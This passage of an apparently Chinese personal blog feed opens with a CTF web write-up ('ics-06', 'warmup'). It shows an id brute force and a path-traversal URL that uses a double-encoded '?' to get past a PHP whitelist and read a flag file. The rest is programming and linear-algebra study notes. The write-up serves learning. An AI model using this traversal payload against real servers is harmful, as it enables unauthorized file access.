<h3 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a>ics-06</h3><p>打开是一个网址，点一遍后，发现只有报表中心跳转，进入了一个新页面。</p>
<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/30.png" alt="e67caa63d8e5e1491213a85b291cafd8.png"></p>
<p>注意那个id，这个是爆破，打开bp，然后选择数字，先从1到10000跑跑试试。</p>
<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/31.png" alt="4c130f95e90194ed830347cc9c0a8559.png"></p>
<p>然后得出2333。将id改为2333，得出flag。</p>
<h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><p>f12提示source.php,打开<img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/32.png" alt="ee16fb77a84e65023ab55faa42f75dda.png"><br>还有个hint.php</p>
<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/33.png" alt="97468ca3d7f89f97cf74091854e0aba3.png"></p>
<p>知道应该在这个ffffllllaaaagggg<br>接下来就是找这个文件了<br><strong>代码审计</strong><br>checkfile()函数</p>
<ol>
<li>定义了一个白名单：source.php和hint.php，判断$page是否为空、是否为字符串。</li>
<li>判断$page是否在白名单里，若存在返回true；</li>
<li>考虑到page有参数的情况，$_page是取出$page问号前的东西，然后再判断$_page是否在白名单里，若存在则返回true；</li>
<li>如果上一步判断失败，则又考虑了url编码的问题，因为url在传入以后服务器会自动进行一次解码。因此传入二次编码后的内容，就可以使checkfile返回true。</li>
</ol>
<p>接下来就是一个一个试了</p>
<blockquote>
<p>mb_substr ( string $str , int $start [, int $length = NULL [, string $encoding = mb_internal_encoding() ]] ) : string</p>
</blockquote>
<p>根据字符数执行一个多字节安全的 substr() 操作。 位置是从 str 的开始位置进行计数。 第一个字符的位置是 0。第二个字符的位置是 1，以此类推。</p>
<blockquote>
<p>mb_strpos ( string $haystack , string $needle [, int $offset = 0 [, string $encoding = mb_internal_encoding() ]] ) : int</p>
</blockquote>
<p>查找 string 在一个 string 中首次出现的位置。<br>第三个if语句中，先进行url解码再截取，因此我们可以将?经过两次url编码，在服务器端提取参数时解码一次，checkFile函数中解码一次，仍会解码为’?’，仍可通过第四个if语句校验。（’?’两次编码值为’%253f’）,构造url：<br>最终在这样构造url得到：</p>
<blockquote>
<p><a href="http://111.198.29.45:34231/source.php?file=source.php%253f../../../../../ffffllllaaaagggg">http://111.198.29.45:34231/source.php?file=source.php%253f../../../../../ffffllllaaaagggg</a></p>
</blockquote>
<p><img src="/2020/03/27/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-WP/34.png" alt="8e9e5cfa2a8b6ed1f577273f92ae4eda.png"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>求最大公约数</title>
    <url>/2020/10/01/%E6%B1%82%E6%9C%80%E5%A4%A7%E5%85%AC%E7%BA%A6%E6%95%B0/</url>
    <content><![CDATA[<h2 id="编程时经常需要求两个数的最大公约数，本文进行一个简单的整理"><a href="#编程时经常需要求两个数的最大公约数，本文进行一个简单的整理" class="headerlink" title="编程时经常需要求两个数的最大公约数，本文进行一个简单的整理"></a>编程时经常需要求两个数的最大公约数，本文进行一个简单的整理</h2><span id="more"></span>
<h2 id="辗转相除法（欧几里得算法）"><a href="#辗转相除法（欧几里得算法）" class="headerlink" title="辗转相除法（欧几里得算法）"></a>辗转相除法（欧几里得算法）</h2><p><img src="/2020/10/01/%E6%B1%82%E6%9C%80%E5%A4%A7%E5%85%AC%E7%BA%A6%E6%95%B0/辗转相除法.png" alt="32b8277a43ceb666963c2d5a00ea53b7.png"></p>
<p>代码块</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">measure</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> z = y;</span><br><span class="line">    <span class="keyword">while</span>(x%y!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">    z = x%y;</span><br><span class="line">    x = y;</span><br><span class="line">    y = z;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> z;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="辗转相减法"><a href="#辗转相减法" class="headerlink" title="辗转相减法"></a>辗转相减法</h2><p><img src="/2020/10/01/%E6%B1%82%E6%9C%80%E5%A4%A7%E5%85%AC%E7%BA%A6%E6%95%B0/辗转相减.png" alt="909aa5d53458b0031cc5835a9c307568.png"></p>
<p>代码块</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">measure</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(a != b)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a&gt;b)</span><br><span class="line">        &#123;</span><br><span class="line">            a = a - b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            b = b - a;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> a;</span><br></pre></td></tr></table></figure>
<h2 id="穷举法"><a href="#穷举法" class="headerlink" title="穷举法"></a>穷举法</h2><p><img src="/2020/10/01/%E6%B1%82%E6%9C%80%E5%A4%A7%E5%85%AC%E7%BA%A6%E6%95%B0/穷举.png" alt="385883d20f237cdeae38792bc1de2cb7.png"></p>
<p>代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">measure</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(temp = x ; ; temp-- )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(x%temp == <span class="number">0</span> &amp;&amp; y%temp==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>programming</tag>
      </tags>
  </entry>
  <entry>
    <title>矩阵乘法</title>
    <url>/2020/02/02/%E7%9F%A9%E9%98%B5%E4%B9%98%E6%B3%95/</url>
    <content><![CDATA[<h3 id="本文为蓝桥杯矩阵乘法的题解。"><a href="#本文为蓝桥杯矩阵乘法的题解。" class="headerlink" title="本文为蓝桥杯矩阵乘法的题解。"></a>本文为蓝桥杯矩阵乘法的题解。</h3><span id="more"></span>
<p>题目描述<br><img src="/2020/02/02/%E7%9F%A9%E9%98%B5%E4%B9%98%E6%B3%95/矩阵乘法.png" alt="题目描述"><br>运用到矩阵幂的方法<br><figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line">str1 = input()</span><br><span class="line">arr1 = str1.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">m = int(arr1[<span class="number">0</span>])</span><br><span class="line">n = int(arr1[<span class="number">1</span>])</span><br><span class="line"><span class="symbol">Arr1</span> = [[] for i in range(m)]</span><br><span class="line"><span class="symbol">Arr2</span> = []</span><br><span class="line"><span class="symbol">Arr3</span> = []</span><br><span class="line">for i in range(m):</span><br><span class="line">    <span class="symbol">Arr2</span>.append([])</span><br><span class="line">    <span class="symbol">Arr3</span>.append([])</span><br><span class="line">    for j in range(m):</span><br><span class="line">        <span class="symbol">Arr2</span>[i].append(<span class="number">0</span>)</span><br><span class="line">        <span class="symbol">Arr3</span>[i].append(<span class="number">0</span>)</span><br><span class="line">for i in range(m):</span><br><span class="line">    str2 = input()</span><br><span class="line">    <span class="symbol">Arr1</span>[i] = str2.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">for i in range(m):</span><br><span class="line">    for j in range(m):</span><br><span class="line">        <span class="symbol">Arr2</span>[i][j] = <span class="symbol">Arr1</span>[i][j]</span><br><span class="line">        if n == <span class="number">0</span>: #当为<span class="number">0</span>次幂时，为单位矩阵</span><br><span class="line">            if i == j:</span><br><span class="line">                <span class="symbol">Arr3</span>[i][j] = <span class="number">1</span></span><br><span class="line">            else:</span><br><span class="line">                <span class="symbol">Arr3</span>[i][j] = <span class="number">0</span></span><br><span class="line">        else:</span><br><span class="line">            <span class="symbol">Arr3</span>[i][j] = <span class="symbol">Arr1</span>[i][j]</span><br><span class="line">for t in range(n<span class="number">-1</span>):</span><br><span class="line">    for i in range(n):</span><br><span class="line">        for j in range(m):</span><br><span class="line">            tmp = <span class="number">0</span></span><br><span class="line">            for k in range(m):</span><br><span class="line">                tmp += int(<span class="symbol">Arr2</span>[i][k]) * int(<span class="symbol">Arr1</span>[k][j]) #矩阵相乘</span><br><span class="line">            <span class="symbol">Arr3</span>[i][j] = tmp</span><br><span class="line">    for i in range(m):</span><br><span class="line">        for j in range(m):</span><br><span class="line">            <span class="symbol">Arr2</span>[i][j] = <span class="symbol">Arr3</span>[i][j]</span><br><span class="line">for i in range(m):</span><br><span class="line">    for j in range(m):</span><br><span class="line">        print(<span class="symbol">Arr3</span>[i][j],end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    print()</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>programming</category>
      </categories>
      <tags>
        <tag>programming</tag>
      </tags>
  </entry>
  <entry>
    <title>线性代数-向量</title>
    <url>/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E5%90%91%E9%87%8F/</url>
    <content><![CDATA[<h2 id="向量及其运算"><a href="#向量及其运算" class="headerlink" title="向量及其运算"></a>向量及其运算</h2><h3 id="向量及其运算的概念"><a href="#向量及其运算的概念" class="headerlink" title="向量及其运算的概念"></a>向量及其运算的概念</h3><h4 id="向量的定义"><a href="#向量的定义" class="headerlink" title="向量的定义"></a>向量的定义</h4><p>由n个数$a_1,a_2,\dotsb,a_n$所组成的有序数组$\alpha=(a_1,a_2,\dotsb,a_n)^T$或$\alpha=(a_1,a_2,\dotsb,a_n)$叫做n维列向量或n维行向量</p>
<h4 id="向量的线性运算"><a href="#向量的线性运算" class="headerlink" title="向量的线性运算"></a>向量的线性运算</h4><p>设$\alpha=(a_1,a_2,\dotsb,a_n)^T,\beta=(b_1,b_2,\dotsb,b_n)^T$，则</p>
<script type="math/tex; mode=display">k\alpha=(k\alpha_1,k\alpha_2,\dotsb,ka_n)^T,\\ \alpha\pm\beta=(a_1\pm b_1,a_2\pm b_2,\dotsb,a_n\pm b_n)^T</script><p>相等 $\alpha=\beta\Leftrightarrow\alpha,\beta$同维，且对应分量$a_i=b_i,i=1,2,\dotsb,n.$<br><span id="more"></span></p>
<p><strong>向量的模</strong> 设向量$\alpha=(a_1,a_2,\dotsb,a_n)$，称 $\sqrt{(a_1^2+a_2^2+\dotsb+a_n^2)}$为向量$\alpha$ 的模，记为$|\alpha|$，即$|\alpha|=\sqrt{(a_1^2+a_2^2+\dotsb+a_n^2)}$</p>
<p><strong>向量的单位化</strong> 设$\alpha=(a_1,a_2,\dotsb,a_n)$为非零向量，与向量$\alpha$方向相同且单位长度为1的向量称为向量$\alpha$对应的单位向量，令 $\alpha^0=\frac{1}{|\alpha|}\alpha$，则$\alpha^0$为向量$\alpha$的单位化向量</p>
<h3 id="向量内积的运算"><a href="#向量内积的运算" class="headerlink" title="向量内积的运算"></a>向量内积的运算</h3><h4 id="向量内积的定义"><a href="#向量内积的定义" class="headerlink" title="向量内积的定义"></a>向量内积的定义</h4><p>设有 n 维向量$\alpha=(a_1,a_2,\dotsb,a_n)^T,\beta=(b_1,b_2,\dotsb,b_n)^T$，则内积$(\alpha,\beta)=\alpha^T\beta=\beta^T\alpha=\sum_{i=1}^na_ib_i$</p>
<h4 id="内积的性质"><a href="#内积的性质" class="headerlink" title="内积的性质"></a>内积的性质</h4><ol>
<li>$(\alpha,\beta)=(\beta,\alpha)=\alpha^T\beta=\beta^T\alpha$ 对称性；</li>
<li>$(\alpha,\alpha)=\alpha^T\alpha=|\alpha|^2$，且$(\alpha,\alpha)=0\Leftrightarrow\alpha=0$</li>
<li>$(\alpha,k_1\beta_1+\dotsb+k_n\beta_n)=k_1(\alpha_1\beta_1)+k_2(\alpha_1\beta_2)+\dotsb+k_n(\alpha_1\beta_n)$</li>
<li>若 $(\alpha,\beta)=0\Leftrightarrow a_1b_2+a_2b_2+\dotsb+a_nb_n=0$，称$\alpha,\beta$正交，记为$\alpha\perp\beta$</li>
<li>$(\alpha,\alpha)\ge0$,等号成立当且仅当$\alpha=0$ 正定性</li>
</ol>
<h4 id="正交单位向量"><a href="#正交单位向量" class="headerlink" title="正交单位向量"></a>正交单位向量</h4><p>设$a_1,a_2,\dotsb,a_n$是n维向量，若<br>(1) $(\alpha_i,\alpha_j)=0(i\ne j,i,j=1,2,\dotsb,n)$;<br>(2) $a_1,a_2,\dotsb,a_n$是单位向量，<br>则称$a_1,a_2,\dotsb,a_n$为正交单位向量</p>
<h3 id="正交矩阵"><a href="#正交矩阵" class="headerlink" title="正交矩阵"></a>正交矩阵</h3><h4 id="正交矩阵的定义"><a href="#正交矩阵的定义" class="headerlink" title="正交矩阵的定义"></a>正交矩阵的定义</h4><p>设 A 为 n 阶矩阵，若$AA^T=A^TA=E$，则称 A 为正交矩阵</p>
<h4 id="正交矩阵的性质"><a href="#正交矩阵的性质" class="headerlink" title="正交矩阵的性质"></a>正交矩阵的性质</h4><ol>
<li>A是正交矩阵$\Leftrightarrow A^{-1}=A^T$</li>
<li>由$AA^T=A^T=E$，知$|A|^2=1\Leftrightarrow|A|=\pm1$</li>
<li>正交矩阵A的几何含义：A的列（或行）是两两垂直的单位向量</li>
</ol>
<h2 id="向量组的线性相关性与线性表示"><a href="#向量组的线性相关性与线性表示" class="headerlink" title="向量组的线性相关性与线性表示"></a>向量组的线性相关性与线性表示</h2><h3 id="向量组"><a href="#向量组" class="headerlink" title="向量组"></a>向量组</h3><p>若干个同维数的行向量（或同维数的列向量）所组成的集合叫做<em>向量组</em><br>$\alpha_1,\alpha_2,\dotsb,\alpha_r$及$\alpha_1,\alpha_2,\dotsb,\alpha_r,\dotsb,\alpha_s$(其中$s\ge r$),称$\alpha_1,\alpha_2,\dotsb,\alpha_r$是$\alpha_1,\alpha_2,\dotsb,\alpha_s$的<em>部分组</em>，$\alpha_1,\alpha_2,\dotsb,\alpha_s$是<em>整体组</em><br>向量组$\alpha_1=[a_{11},a_{21},\dotsb,a_{r1}]^T,\alpha_2=[a_{12},a_{22},\dotsb,a_{r2}]^T,\dotsb,\alpha_m=[a_{1m},a_{2m},\dotsb,a_{rm}]^T$及$\widetilde{\alpha_1}=[a_{11},a_{21},\dotsb,a_{r1},\dotsb,a_{s1}]^T,\widetilde{\alpha_2}=[a_{12},a_{22},\dotsb,a_{r2},\dotsb,a_{s2}]^T,\dotsb,\widetilde{\alpha_m}=[a_{1m},a_{2m},\dotsb,a_{rm},\dotsb,a_{sm}]^T$其中$s\ge r$，则称$\widetilde{\alpha_1},\widetilde{\alpha_2},\dotsb,\widetilde{\alpha_m}$为向量组$\alpha_1,\alpha_2,\dotsb,\alpha_m$的<em>延伸组</em>（或称$\alpha_1,\alpha_2,\dotsb,\alpha_m$是$\widetilde{\alpha_1},\widetilde{\alpha_2},\dotsb,\widetilde{\alpha_m}$的<em>缩短组</em>）</p>
<h3 id="向量组线性相关"><a href="#向量组线性相关" class="headerlink" title="向量组线性相关"></a>向量组线性相关</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><p>对 m 个 n 维向量$\alpha_1,\alpha_2,\dotsb,\alpha_m$，若存在不全为零的数$k_1,k_2,\dotsb,k_m$，使得$k_1\alpha_1+k_2\alpha_2+\dotsb+k_m\alpha_m=0$成立，则称向量组$\alpha_1,\alpha_2,\dotsb,\alpha_m$<em>线性相关</em></p>
<h4 id="等价说法"><a href="#等价说法" class="headerlink" title="等价说法"></a>等价说法</h4><p>若$\alpha_1,\alpha_2,\dotsb,\alpha_m$是n维列向量，存在不全为零的数$k_1,k_2,\dotsb,k_m$使得$k_1\alpha_1+k_2\alpha_2+\dotsb+k_m\alpha_m=0\Leftrightarrow$齐次线性方程组$(\alpha_1,\alpha_2,\dotsb,\alpha_n)\begin{bmatrix}<br>    k_1\\<br>    k_2 \\<br>    \vdots \\<br>    k_m<br>\end{bmatrix}=0$有非零解$\Leftrightarrow r(\alpha_1,\alpha_2,\dotsb,\alpha_n)&lt;m$</p>
<h4 id="判别向量组线性相关的常用步骤"><a href="#判别向量组线性相关的常用步骤" class="headerlink" title="判别向量组线性相关的常用步骤"></a>判别向量组线性相关的常用步骤</h4><p>设$\alpha_1,\alpha_2,\dotsb,\alpha_m$是n维向量</p>
<ol>
<li>当$m&gt;n$时，向量组必线性相关；</li>
<li>当$m=n$时，若行列式$|(\alpha_1,\alpha_2,\dotsb,\alpha_n)|=0$，则向量组必线性相关；</li>
<li>当$m&lt;n$时，若秩$r(\alpha_1,\alpha_2,\dotsb,\alpha_n)&lt;m$，则向量组必线性相关</li>
</ol>
<h3 id="向量组线性无关"><a href="#向量组线性无关" class="headerlink" title="向量组线性无关"></a>向量组线性无关</h3><h4 id="线性无关定义"><a href="#线性无关定义" class="headerlink" title="线性无关定义"></a>线性无关定义</h4><p>对 m 个 n 维向量$\alpha_1,\alpha_2,\dotsb,\alpha_m$，若$k_1\alpha_1+k_2\alpha_2+\dotsb+k_m\alpha_m=0$成立，当且仅当$k_1=k_2=\dotsb=k_m=0$，则称$\alpha_1,\alpha_2,\dotsb,\alpha_n$线性无关</p>
<h4 id="线性无关等价说法"><a href="#线性无关等价说法" class="headerlink" title="线性无关等价说法"></a>线性无关等价说法</h4><p>若$\alpha_1,\alpha_2,\dotsb,\alpha_m$是n维列向量，则向量组线性无关$\Leftrightarrow$齐次线性方程组$(\alpha_1,\alpha_2,\dotsb,\alpha_n)\begin{bmatrix}<br>    k_1\\<br>    k_2 \\<br>    \vdots \\<br>    k_m<br>\end{bmatrix}=0$只有零解$\Leftrightarrow r(\alpha_1,\alpha_2,\dotsb,\alpha_n)=m$</p>
<h4 id="判别向量组线性无关的常用方法"><a href="#判别向量组线性无关的常用方法" class="headerlink" title="判别向量组线性无关的常用方法"></a>判别向量组线性无关的常用方法</h4><ol>
<li>定义法:设$k_1\alpha_1+k_2\alpha_2+\dotsb+k_m\alpha_m=0\Rightarrow k_1=k_2=\dotsb=k_m=0$。</li>
<li>利用行列式$|(\alpha_1,\alpha_2,\dotsb,\alpha_m)|\ne0$或$r(\alpha_1,\alpha_2,\dotsb,\alpha_m)=m$进行判别</li>
</ol>
<h3 id="线性表示"><a href="#线性表示" class="headerlink" title="线性表示"></a>线性表示</h3><h4 id="线性表示定义"><a href="#线性表示定义" class="headerlink" title="线性表示定义"></a>线性表示定义</h4><p>设m 个 n 维向量$\alpha_1,\alpha_2,\dotsb,\alpha_m$，存在m个数$k_1,k_2,\dotsb,k_m$，使得$\beta=k_1\alpha_1+k_2\alpha_2+\dotsb+k_m\alpha_m$,则称$\beta$可由$a_1,a_2,\dotsb,a_m$线性表示</p>
<h4 id="线性表示等价说法"><a href="#线性表示等价说法" class="headerlink" title="线性表示等价说法"></a>线性表示等价说法</h4><p>设$\alpha_1,\alpha_2,\dotsb,\alpha_m$是n维列向量，存在$k_1,k_2,\dotsb,k_m$使得$\beta=k_1\alpha_1+k_2\alpha_2+\dotsb+k_m\alpha_m\Leftrightarrow$非齐次线性方程组$(\alpha_1,\alpha_2,\dotsb,\alpha_n)\begin{bmatrix}<br>    k_1\\<br>    k_2 \\<br>    \vdots \\<br>    k_m<br>\end{bmatrix}=\beta$有解$\Leftrightarrow r(\alpha_1,\alpha_2,\dotsb,\alpha_n)=r(\alpha_1,\alpha_2,\dotsb,\alpha_n,\beta)$</p>
<p><strong>说明：</strong><br>若非齐次线性方程组有唯一解，则$\beta$可由$\alpha_1,\alpha_2,\dotsb,\alpha_m$唯一表示；若非齐次线性方程组有无穷多解，则线性表示不唯一<br>设$\alpha_1,\alpha_2,\dotsb,\alpha_n$线性无关，而$\beta,a_1,a_2,\dotsb,a_m$线性相关，则$\beta$可由$\alpha_1,\alpha_2,\dotsb,\alpha_n$线性表示，且表示方法唯一</p>
<h3 id="极大线性无关组与向量组等价"><a href="#极大线性无关组与向量组等价" class="headerlink" title="极大线性无关组与向量组等价"></a>极大线性无关组与向量组等价</h3><h4 id="极大线性无关组"><a href="#极大线性无关组" class="headerlink" title="极大线性无关组"></a>极大线性无关组</h4><p>设向量组$\alpha_1,\alpha_2,\dotsb,\alpha_n$满足：<br>(1) 向量组$\alpha_1,\alpha_2,\dotsb,\alpha_n$中有r个向量线性无关；<br>(2) 向量组$\alpha_1,\alpha_2,\dotsb,\alpha_n$中任意r+1个向量（如果有）线性相关，<br>则称这r个线性无关的向量为该向量组的一个极大线性无关组，其中r称为向量组的秩，即$r(\alpha_1,\alpha_2,\dotsb,\alpha_n)=r$</p>
<h4 id="向量组等价"><a href="#向量组等价" class="headerlink" title="向量组等价"></a>向量组等价</h4><ol>
<li>设n维向量组$(I)\alpha_1,\alpha_2,\dotsb,\alpha_s,(II)\beta_1,\beta_2,\dotsb,\beta_t$，若向量组(I)可由向量组(II)线性表示，且向量组(II)也可以由向量组(I)线性表示（互相线性表示），则称(I)与(II)等价</li>
<li>向量组(I)与向量组(II)等价$\overset{\Rightarrow}{\nLeftarrow}r(I)=r(II)$</li>
</ol>
<h4 id="利用向量组的秩判别线性表示"><a href="#利用向量组的秩判别线性表示" class="headerlink" title="利用向量组的秩判别线性表示"></a>利用向量组的秩判别线性表示</h4><ol>
<li>$r(\alpha_1,\alpha_2,\dotsb,\alpha_m,\beta)=r(\alpha_1,\alpha_2,\dotsb,\alpha_m)\Leftrightarrow\beta$可由$\alpha_1,\alpha_2,\dotsb,\alpha_m$线性表示；$r(\alpha_1,\alpha_2,\dotsb,\alpha_m,\beta)=r(\alpha_1,\alpha_2,\dotsb,\alpha_m)+1\Leftrightarrow\beta$<br>不能由$\alpha_1,\alpha_2,\dotsb,\alpha_m$线性表示</li>
<li>$\beta$可由$\alpha_1,\alpha_2,\dotsb,\alpha_m$唯一线性表示的充要条件为<script type="math/tex">r(\alpha_1,\alpha_2,\dotsb,\alpha_m,\beta)=r(\alpha_1,\alpha_2,\dotsb,\alpha_m)=s</script></li>
<li>向量组$(\beta_1,\beta_2,\dotsb,\beta_t)$可由$(\alpha_1,\alpha_2,\dotsb,\alpha_s)$线性表示的充要条件为<script type="math/tex">r(\alpha_1,\alpha_2,\dotsb,\alpha_s,\beta_1,\beta_2,\dotsb,\beta_t)=r(\alpha_1,\alpha_2,\dotsb,\alpha_s)</script></li>
<li>向量组$(\alpha_1,\alpha_2,\dotsb,\alpha_s)$与向量组$(\beta_1,\beta_2,\dotsb,\beta_t)$等价的充要条件为<script type="math/tex">r(\beta_1,\beta_2,\dotsb,\beta_t)=r(\alpha_1,\alpha_2,\dotsb,\alpha_s,\beta_1,\beta_2,\dotsb,\beta_t)=r(\alpha_1,\alpha_2,\dotsb,\alpha_s)</script></li>
</ol>
<h2 id="相关性常用结论"><a href="#相关性常用结论" class="headerlink" title="相关性常用结论"></a>相关性常用结论</h2><h3 id="判别向量组线性相关性的主要方法"><a href="#判别向量组线性相关性的主要方法" class="headerlink" title="判别向量组线性相关性的主要方法"></a>判别向量组线性相关性的主要方法</h3><p><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E5%90%91%E9%87%8F/相关性-1.png" alt="photo"><br><img src="/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E5%90%91%E9%87%8F/相关性-2.png" alt="photo"></p>
<h3 id="常用结论"><a href="#常用结论" class="headerlink" title="常用结论"></a>常用结论</h3><ol>
<li>向量组的扩大与缩小$\begin{cases}<br> 线性无关向量组缩小后仍线性无关 \\<br> 线性相关向量扩大后仍线性相关<br>\end{cases}$</li>
<li>向量的分量增加与减少$\begin{cases}<br> 线性无关组分量增加后仍线性无关 \\<br> 线性相关组分量减少后仍线性相关<br>\end{cases}$</li>
<li>若向量组(I)可由向量组(II)线性表示，则$r(I)\le r(II)$</li>
<li>以少表多，多的相关，即若$\beta_1,\beta_2,\dotsb,\beta_t$可由$\alpha_1,\alpha_2,\dotsb,\alpha_s$线性表示，且$s&lt;t$，则$\beta_1,\beta_2,\dotsb,\beta_t$线性相关；如果$\alpha_1,\alpha_2,\dotsb,\alpha_s$线性无关，且$\alpha_1,\alpha_2,\dotsb,\alpha_s$可由$\beta_1,\beta_2,\dotsb,\beta_t$线性表出，则$s\le t$</li>
<li>若向量组(I)可由向量组(II)可相互线性表示，即(I)与(II)等价，则$r(I)=r(II)$</li>
<li>若向量组(I)可由向量组(II)线性表示，且$r(I)=r(II)$，则向量组(I)与向量组(II)等价</li>
<li>若$\alpha_1,\alpha_2,\dotsb,\alpha_s$线性无关，且可由$\beta_1,\beta_2,\dotsb,\beta_s$线性表示，则这两个向量组等价</li>
<li>设$\beta$可由$\alpha_1,\alpha_2,\dotsb,\alpha_s$线性表示，则表示法唯一的充要条件是$\alpha_1,\alpha_2,\dotsb,\alpha_s$线性无关</li>
<li>已知n维向量组$\alpha_1,\alpha_2,\dotsb,\alpha_k$线性无关，$\alpha_{k+1}=\lambda_1\alpha_1+\lambda_2\alpha_2+\dotsb+\lambda_k\alpha_k(\lambda_i\ne0,i=1,2,\dotsb,k)$，则$\alpha_1,\alpha_2,\dotsb,\alpha_k,\alpha_{k+1}$中任意k个向量都线性无关</li>
<li>设<script type="math/tex">(\beta_1,\beta_2,\beta_3)=(\alpha_1,\alpha_2,\alpha_3)\begin{bmatrix}
c_{11} &c_{12} &c_{13} \\
c_{21} &c_{22} &c_{23} \\
c_{31} &c_{32} &c_{33}
\end{bmatrix}</script>，记$C=(c_{ij})_{3\times3}$。若$\alpha_1,\alpha_2,\alpha_3$线性无关，则$\beta_1,\beta_2,\beta_3$线性无关$\Leftrightarrow$矩阵C可逆</li>
<li>设$\alpha_1,\alpha_2,\dotsb,\alpha_s$线性无关，且$\beta_1=\alpha_1+\alpha_2,\beta_2=\alpha_2+\alpha_3,\dotsb,\beta_s=\alpha_s+\alpha_1$，则当s为偶数时，$\beta_1,\beta_2,\dotsb,\beta_s$线性相关；当s为奇数时，$\beta_1,\beta_2,\dotsb,\beta_s$线性无关</li>
<li>A的列向量$\alpha_1,\alpha_2,\dotsb,\alpha_n$线性相关(无关)$\Leftrightarrow$方程组$Ax=0$有非零解(只有零解)</li>
<li>A的行向量组$\beta_1,\beta_2,\dotsb,\beta_m$线性相关(无关)$\Leftrightarrow$方程组$A^Tx=0$有非零解(只有零解)</li>
<li>n+1个n维向量一定线性相关</li>
</ol>
<h3 id="正交规范化、正交矩阵"><a href="#正交规范化、正交矩阵" class="headerlink" title="正交规范化、正交矩阵"></a>正交规范化、正交矩阵</h3><p><strong>定义</strong> 两个向量$\alpha,\beta$夹角的余弦为$\cos(\overbrace{\alpha,\beta})=\frac{(\alpha,\beta)}{\lVert\alpha\rVert\lVert\beta\rVert}$当$(\alpha,\beta)=0$时，则$\cos(\overbrace{\alpha,\beta})=0,(\overbrace{\alpha,\beta})=\frac{\pi}{2}$，此时称$\alpha,\beta$正交<br><em>零向量与任何向量正交</em></p>
<h4 id="施密特正交化"><a href="#施密特正交化" class="headerlink" title="施密特正交化"></a>施密特正交化</h4><p><strong>施密特正交化方法</strong><br>设向量组$\alpha_1,\alpha_2,\alpha_3$线性无关，其标准正交化的方法如下<br>先正交化，取</p>
<script type="math/tex; mode=display">\beta_1=\alpha_1\\\beta_2=\alpha_2-\frac{(\alpha_2,\beta_1)}{(\beta_1,\beta_1)}\beta_1\\\beta_3=\alpha_3-\frac{(\alpha_3,\beta_1)}{(\beta_1,\beta_1)}\beta_1-\frac{(\alpha_3,\beta_2)}{(\beta_2,\beta_2)}\beta_2</script><p>则$\beta_1,\beta_2,\beta_3$是正交向量组。<br>再将$\beta_1,\beta_2,\beta_3$单位化，取</p>
<script type="math/tex; mode=display">\eta_1=\frac{\beta_1}{\lvert\beta_1\rvert},\eta_2=\frac{\beta_2}{\lvert\beta_2\rvert},\eta_3=\frac{\beta_3}{\lvert\beta_3\rvert}</script><p>则$\eta_1,\eta_2,\eta_3$是标准正交向量组，即有$(\eta_i,\eta_j)=\begin{cases}<br>    0,i\ne j\\<br>    1,,i=j<br>\end{cases}$</p>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>线性代数</tag>
      </tags>
  </entry>
  <entry>
    <title>算法提高 分苹果</title>
    <url>/2020/02/03/%E7%AE%97%E6%B3%95%E6%8F%90%E9%AB%98-%E5%88%86%E8%8B%B9%E6%9E%9C/</url>
    <content><![CDATA[<h3 id="本文为蓝桥杯分苹果的python题解"><a href="#本文为蓝桥杯分苹果的python题解" class="headerlink" title="本文为蓝桥杯分苹果的python题解"></a>本文为蓝桥杯分苹果的python题解</h3><span id="more"></span>
